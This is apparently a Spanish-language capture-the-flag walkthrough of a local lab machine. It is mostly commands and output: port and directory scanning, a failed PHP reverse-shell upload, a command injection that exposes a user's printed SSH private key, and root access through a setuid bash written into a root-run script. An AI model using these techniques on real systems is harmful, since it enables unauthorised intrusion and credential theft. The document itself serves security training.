```bash
nmap -O -sV -sC -p- 172.17.0.2
```
**Salida**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:    
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)  
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)  
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
|_http-title: Generador de Reportes - Centro de Operaciones
```

en la página web hay un apartado para subir archivos al servidor, lo intentaremos explotar luego de terminar con la busqueda de directorios ocultos

```bash
gobuster dir -w /home/eduard/wordList/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2 -x php,html,txt


/.php                 (Status: 403) [Size: 275]  
/.html                (Status: 403) [Size: 275]  
/index.php            (Status: 200) [Size: 3317]  
/upload.html          (Status: 200) [Size: 2314]  
/upload.php           (Status: 200) [Size: 33]  
/old                  (Status: 301) [Size: 306] [--> http://172.17.0.2/old/]  
/.php                 (Status: 403) [Size: 275]  
/.html                (Status: 403) [Size: 275]
```
vamos a subir una reverse shell escrita en php
```
nano exploit.php
nc -lvnp 443
```
y pegamos el código del github https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Tenemos que modificar la ip y poner la nuestra, tambien el puerto por el que queremos escuchar

subimos el archivo y sale un mensaje de subida exitosa. Nos dirigimos a 172.17.0.2/upload.php y nos indica 
`No se ha enviado ningún archivo.`
capturamos con burpsuite la petición e indica que ha habido un error al mover el archivo. Parece que este no es el camino
![[Vulnvault_Burpsuite1.png]]

![[Vulnvault_Burpsuite2.png]]

vamos a probar con `generador de reportes`
intentamos un `Server-Side Template Injection (SSTI)`
```bash
{{7*7}}
```
pero no da resultado

Probamos con un command injection y funciona

![[Vulnvault_CommandInjection1.png]]

![[Vulnvault_CommandInjection2.png]]

ya tenemos uno de los usuarios: `samara`. vamos a usar hydra para entrar via ssh

```bash
hydra -l samara -P /home/eduard/wordList/rockyou.txt ssh://172.17.0.2
```

no consigo la contraseña por fuerza bruta, vamos a continuar buscando con `comand injection`a ver si logramos encontrar en algún archivo la clave

```bash
; ls /root
; ls /home/samara -la
-----------------------------------------------------------------
Nombre: \
ls: cannot open directory '/root': Permission denied

drwxr-xr-x 1 samara samara   25 Aug 13 00:27 .
drwxr-xr-x 1 root   root     20 Aug 20  2024 ..
-rw------- 1 samara samara  218 Aug 20  2024 .bash_history
-rw-r--r-- 1 samara samara  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 samara samara 3771 Aug 20  2024 .bashrc
drwx------ 2 samara samara   34 Aug 20  2024 .cache
drwxrwxr-x 3 samara samara   19 Aug 20  2024 .local
-rw-r--r-- 1 samara samara  807 Aug 20  2024 .profile
drwxr-xr-x 2 samara samara   61 Aug 20  2024 .ssh
-rw-r--r-- 1 root   root     35 Aug 14 00:07 message.txt
-rw------- 1 samara samara   33 Aug 20  2024 user.txt

```
No hay nada en message y user.txt
```bash
Nombre: \
No tienes permitido estar aqui :(.
Fecha: \
cat: /home/samara/user.txt: Permission denied
```
Pero si tenemos la clave ssh

```bash
cat /home/samara/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9HEXYsEOUt5PUH/2fHI/buNxluV3x2qL6wATg0scjIeog9LSmW3k
K3NLw5yDON2vEfZxRSuEkUd743i2AZq/gekNEpvuUTnruRTibz/hZojm8CBpjgXccJW63a
ksBBS/G8iqTa4i9l9GFF0ytuGJ5CmAQy37dgNfsP015OrlN8jg56rtbUyR9kfscYU8R/B0
GDUo60Ek9kzv6QXzkVf/lmnKlVO/4ioJ5iEyL1z91NxBHsOWNQBCjry3kOYDynRD5mKj/g
2OZ/TWpTh/QylyKFfDQYPrbjXXWEe8nnzmoDolKtWvez0Sjig7TBV0z2swcvIuWoxwNFVL
0j/FnwkwYihlbLWi9Gu6ZeddY2+5RfZPRSZrd0+yOvUqHtZHBMBM5nMVyHoh78QyW8bA/q
K93VoLNrf8o19YyZoeNqVP03PE/sSE953JahsHr2iPyNb3q/Hgm+1mn5zL8e++oThK/s43
GeaCpew8JbRf1mD6lkfNZEhAQ2TXvtKRwvWmLxSYmExqgzXD7/XP/ZLUKNO+hQByu+l+VG
Hm2v37ndhOhvstHhNr55GF3/hcnNsg3EeScEENFUtyOkpP/+UDvCnL/0CFNKah66QavAiD
Y0hF4ZbgGK9U/A7nhRRFOMSJ5Exn5kJnpJ88R4CsoTUrRXKTV2PB6WlBvwnrjcZqEZJtr2
MAAAdQRX/EGUV/xBkAAAAHc3NoLXJzYQAAAgEA9HEXYsEOUt5PUH/2fHI/buNxluV3x2qL
6wATg0scjIeog9LSmW3kK3NLw5yDON2vEfZxRSuEkUd743i2AZq/gekNEpvuUTnruRTibz
/hZojm8CBpjgXccJW63aksBBS/G8iqTa4i9l9GFF0ytuGJ5CmAQy37dgNfsP015OrlN8jg
56rtbUyR9kfscYU8R/B0GDUo60Ek9kzv6QXzkVf/lmnKlVO/4ioJ5iEyL1z91NxBHsOWNQ
BCjry3kOYDynRD5mKj/g2OZ/TWpTh/QylyKFfDQYPrbjXXWEe8nnzmoDolKtWvez0Sjig7
TBV0z2swcvIuWoxwNFVL0j/FnwkwYihlbLWi9Gu6ZeddY2+5RfZPRSZrd0+yOvUqHtZHBM
BM5nMVyHoh78QyW8bA/qK93VoLNrf8o19YyZoeNqVP03PE/sSE953JahsHr2iPyNb3q/Hg
m+1mn5zL8e++oThK/s43GeaCpew8JbRf1mD6lkfNZEhAQ2TXvtKRwvWmLxSYmExqgzXD7/
XP/ZLUKNO+hQByu+l+VGHm2v37ndhOhvstHhNr55GF3/hcnNsg3EeScEENFUtyOkpP/+UD
vCnL/0CFNKah66QavAiDY0hF4ZbgGK9U/A7nhRRFOMSJ5Exn5kJnpJ88R4CsoTUrRXKTV2
PB6WlBvwnrjcZqEZJtr2MAAAADAQABAAACABgooeGPkrKrqGtx14gcIzB6nSwx41aGWBbH
6/sdbiW7dfMKtT1saCZyijSRNZeQsq/+oITwFKA70D7pRr++LhrmUCBHNf9kJJZ8aGwLWb
kbDbas1Wcv0Bt2c5YFwBpqfIAqox5IosmhHUQqTowBmscTN6CBcmlgUvxN7POCKFkM6vbV
OgsD4XyARkTqoKG8M5UoPTI8aYKdlFZ+UUDLpts++xfVblD+y6Spd5QecjMv+OWpT0v6Cc
ShWoPLypMfTjipBhaNUMZDI1Wypu1EiDT8MN7lmAainp+/KKFXVynTJVToR/l7oz0BNT8Y
ncdZi4ZzcL5f7pUAMHKyp9Lx2GH3CAxSYpGS9lPF3hdVjaKEW9v5yk91zvPrS/OZ6pINHs
nqw2t+IZ+vMVujFThHqaYKV4etS2vJVTPSPX7xplGmspALOpmQlsF+N4XIxYxgGWzR/Z3w
mIHb67XNtFyjAShT9AV+DmqQ8KX/MPBu7D86asXmX2Sis8lgPIySOw5WZEgNRHZHYkie0K
q0e+s4WeMFjw3XMDG68hCQ81sVAcwVleQnYaooAzse9eco3PD7K58IWL99W4IbO1qHZrGz
yLZI4lrB4cwyeVYfmSGRWwof5uV6n7BnQu6yUvWuBpNz8zsGa8oGu45/b3C7RQ1jaim/uh
yOJ7J6/oP8CO5kK5PRAAABAQC1Q2cdNIonHHM6otuWz2PsDwHHKlb4v/8ujanlcCFbpUCZ
erlNqQSbEDPmO2BbBNG7n9aMYY9Dnv1qngjme1sYe8UysJOFU+7npw1XQlRGG1p3x1io3r
c5ZwG++xvXlqUu8kF5kI7nFAQTAtp2dtVzYA6+WYGHvWzS2VvZxMExwSyJGlbDImGbqC5t
YsZ2XYQyXfwWKzsIL6YpoU4OQxrE34TOmu8BJdQsQqmOlhaRa/SUK3PhkPXFRs55nKOqWi
iZDegE3s3kix54ZiX7RUr9c2jD7C35ydCdfeeo7y9MqAsYJ/ODIqXUhpGLroq3v+gNIJ0S
DeunYTifUO3FSd5gAAABAQD9pnXK6cM7jyXVh4RYJx35q4vDz5NWYREMjLD+hvg43avSV3
McYPA6jkdIJaHBBt+S4V5EwnnTXH139HxBX/npVY3mO4BiT4lBk6+CRN1RLzIon8zJcuqT
i+GaxvJHI7ZTOAYUkZd/OUetiHZTzf/gyRNJOLomdE+GFCwEGg1JJi6F1ahNKcGE9+pJ7Z
c7Cq1/nE+ES4I1afGELWuLmOcCpWrdDs1qJeIolHYL65TlTyDJuyuRE72GdM3AoYMSJhj2
qGGctmtik95sGpPAAB5BGOefMKBDHECAYzrXUNvuppkiF4VaDGgc/iLKhaucKzhcRndjzc
X8iDpXbN0k4ZgRAAABAQD2tMsD+7SETGvBUX/ax0rutLFeg3fivvoq6gDSkon5vG4V26FG
jI0f399iS0LC5ws3YYUnnx17bPdRgZMqB//4V3J73H6b8l5xX8N4QmdKgXz6SoPQQa6hLP
jAwS4iPj1dB8gEgkfLD9wdvbg1F6JU/n5xQqmx/bLDsJAOLwZ1sINq/D10CC59VdTiawRV
6QTg21ka2NDuCtp7jd07F+cmjl0MCo5RxLEimjAKcXWfMo0QjfLyK3G6gQGXNdPXOmtd5T
5thFC34OPAvA2+JTP8Xl3ynjH0s2CrMFjUx9TumD50/9NkFaBjqg+DFma1anCmRfByQEi0
SgMRNAiIeiQzAAAAE3NhbWFyYUBjNzc4ZTc5MDExNzkBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
```

lo añadimos a un archivo, le damos permisos y nos conectamos via ssh
```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa samara@172.17.0.2
```

```bash
whoami
# samara
```

ahora si podemos acceder al archivo user.txt
```bash
cat user.txt  
030208509edea7480a10b84baca3df3e
```

Tras un rato buscando como escalar privilegios, encontramos un arcchivo que se ejecuta con privilegios de super usuario. Es un documento que ya vimos anteriormente

```bash
samara@cb15215f66e3:/home$ ps aux | grep samara  
root     1671808  0.0  0.0  14536  8264 ?        Ss   00:18   0:00 sshd: samara [priv]  
samara   1671855  0.3  0.0  14796  6704 ?        S    00:18   0:02 sshd: samara@pts/0  
samara   1671865  0.0  0.0   5016  3852 pts/0    Ss   00:18   0:00 -bash  
samara   1699395  0.0  0.0   3144  1976 pts/0    S+   00:22   0:00 script /dev/null -c bash  
samara   1699398  0.0  0.0   5124  4152 pts/1    Ss   00:22   0:00 bash  
samara   1775175 33.3  0.0   8280  4024 pts/1    R+   00:32   0:00 ps aux  
samara   1775176  0.0  0.0   3956  2344 pts/1    S+   00:32   0:00 grep --color=auto samara  
samara@cb15215f66e3:/home$ ps aux | grep root  
root           1  5.8  0.0   2800  2132 ?        Ss   Aug13  16:22 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done                     <-  <-  <- 
root          15  0.0  0.0  12020  4124 ?        Ss   Aug13   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups  
root          33  0.0  0.2 203452 21780 ?        Ss   Aug13   0:02 /usr/sbin/apache2 -k start  
root     1671808  0.0  0.0  14536  8264 ?        Ss   00:18   0:00 sshd: samara [priv]  
samara   1776496  0.0  0.0   3956  2116 pts/1    S+   00:32   0:00 grep --color=auto root  
```

```bash
cat /usr/local/bin/echo.sh

#!/bin/bash  
  
echo "No tienes permitido estar aqui :(." > /home/samara/message.txt  
```
lo modificamos para que contenga el siguiente contenido:
```bash
#!/bin/bash  
  
chmod u+s /bin/bash
```

```bash
bash -p  
whoami  
# root
```

```bash
ls /root  
root.txt  

cat /root/root.txt  
640c89bbfa2f70a4038fd570c65d6dcc
```